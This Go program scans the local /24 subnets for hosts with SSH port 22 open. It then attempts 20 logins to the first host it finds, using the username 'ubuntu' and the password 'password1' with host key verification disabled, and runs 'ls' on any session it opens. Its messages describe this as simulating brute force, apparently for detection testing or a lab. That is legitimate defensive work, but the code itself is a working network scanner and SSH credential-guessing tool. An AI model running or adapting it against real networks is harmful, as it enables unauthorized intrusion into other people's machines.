package main

import (
	"fmt"
	"net"
	"strconv"
	"time"
	"strings"
	"golang.org/x/crypto/ssh"
)

func get_ips() ([]string, error) {
	var ips []string

	ifaces, err := net.Interfaces()
	if err != nil {
		return ips, err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return ips, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue // not an Ipv4 addr
			}
			ips = append (ips, ip.String())
		}
	}
	return ips, nil
}

func appendIfMissing(slice []string, string string) []string {
	for _, element := range slice {
		if element == string {
			return slice
		}
	}
	return append(slice, string)
}

func expand_ips(ips []string) []string {
	var exp_ips []string

	for _, ip := range ips {
		ipSlice := strings.Split(ip, ".")
		for i := 1; i <= 255; i++ {
			new_ip := ipSlice[0]+"."+ipSlice[1]+"."+ipSlice[2]+"."+strconv.Itoa(i)
			exp_ips = appendIfMissing(exp_ips, new_ip)
		}
	}
	return exp_ips
}

func scanPort(protocol, hostname string, port int) bool {
	address := hostname + ":" + strconv.Itoa(port)
	conn, err := net.DialTimeout(protocol, address, 100*time.Millisecond)

	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func connectToHost(user string, pass string, host string) (*ssh.Client, *ssh.Session, error) {
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
	}
	sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	client, err := ssh.Dial("tcp", host+":22", sshConfig)
	if err != nil {
		return nil, nil, err
	}

	session, err := client.NewSession()
	if err != nil {
		client.Close()
		return nil, nil, err
	}

	return client, session, nil
}

func main() {
	// get ips on this system
	ips, ip_err := get_ips()	
	if ip_err != nil {
		panic(ip_err)
	}

	// get ip ranges from ips found
	exp_ips := expand_ips(ips)

	// check each ip in the slice for open port
	fmt.Println("Scanning IPs in local subnet for open ssh port (22)...")
	var ips_port_open []string
	for _, ip := range exp_ips {
		//fmt.Println("Scanning: "+ip)
		open := scanPort("tcp", ip, 22)
		//fmt.Println("Port 22:", open)
		if (open) {
			//fmt.Println(ip+" has port 22 open")
			ips_port_open = append(ips_port_open, ip)	
		}
	}
	fmt.Println("Found "+strconv.Itoa(len(ips_port_open))+" hosts with port 22 open")
	fmt.Println(ips_port_open)

	// attempt ssh login
	for i := 0; i < 1; i++ {
		fmt.Println("Will choose one from this list to simulate brute force...")
		time.Sleep(1*time.Second)
		fmt.Println("Attempting to ssh to: "+ips_port_open[i])
		// do this 20 times
		for j := 0; j < 20; j++ {
			fmt.Println("Attempt "+strconv.Itoa(j+1))
			client, session, err := connectToHost("ubuntu", "password1", ips_port_open[i])
			if err != nil {
				//panic(err)
				fmt.Println(" ",err)
				continue
			}
			out, err := session.CombinedOutput("ls")
			if err != nil {
				//panic(err)
				fmt.Println(" ",err)
				continue
	       		}
			fmt.Println(string(out))
			client.Close()

			//sleep for 1 second between attempts
			time.Sleep(1*time.Second)
		}
	}
}
